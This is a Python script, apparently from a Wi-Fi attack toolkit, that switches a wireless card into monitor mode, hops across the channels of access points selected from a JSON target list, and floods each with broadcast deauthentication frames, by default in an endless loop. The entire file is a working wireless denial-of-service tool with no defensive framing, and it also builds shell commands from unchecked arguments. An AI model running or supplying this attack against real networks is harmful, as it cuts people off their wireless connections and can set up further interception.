#!/usr/bin/env python
from monitormode import *
from APshandler import *
from deauth import *
import time

signal_strength_pos = 0
ssid_pos = 1
bssid_pos = 2
channel_pos = 3
encryption_pos = 4
select_pos = 5
channels = []

def channel_exist(channel):
    for i in range(len(channels)):
        if channel == channels[i] :
            return 1
    return 0

def channel_set(channel, interface):
    print("[Interface]: %s switching to channel %d" %(interface, int(channel)))
    os.system("iw dev %s set channel %d" %(interface, int(channel)))

def multi_deauth(fileName,interface,count):
    client = 'FF:FF:FF:FF:FF:FF'
    aps_data = open(fileName,"r+")
    apsList = json.load(aps_data)
    aps_data.close()
    aps = apsList["aps"]
    channels = []
    for apid in range(len(aps)):
        if aps[apid][select_pos] == True:
            channel = aps[apid][channel_pos]
            if not channel_exist(channel):
                channels.append(channel)
    if count == 0:
        try:
            while True:
                for channel in range(len(channels)):
                    channel_set(channels[channel],interface)
                    for apid in range(len(aps)):
                        if aps[apid][select_pos] == True:
                            bssid = aps[apid][bssid_pos]
                            deauth(interface, bssid, client)
                    time.sleep(1)
        except KeyboardInterrupt:
            print('[Stop]')
    else:
        for loop in range(count):
            for channel in range(len(channels)):
                channel_set(channels[channel],interface)
                for apid in range(len(aps)):
                    if aps[apid][select_pos] == True:
                        bssid = aps[apid][bssid_pos]
                        deauth(interface, bssid, client)
                time.sleep(1)            

 
if __name__ == "__main__": 
    if (len(sys.argv) != 3) and (len(sys.argv) !=4):
        print('[Usage]: %s target_list interface count' % sys.argv[0])
        print('[Usage]: empty count default to infinite sending')
        sys.exit(1)
    elif (len(sys.argv) == 3):
        aps_list = sys.argv[1]
        interface = sys.argv[2]
        count = 0
    elif (len(sys.argv) == 4):
        aps_list = sys.argv[1]
        interface = sys.argv[2]
        count = int(sys.argv[3])
    interface = monitor_up(interface)
    multi_deauth(aps_list,interface,count)
    interface = monitor_down(interface)
    sys.exit(0)
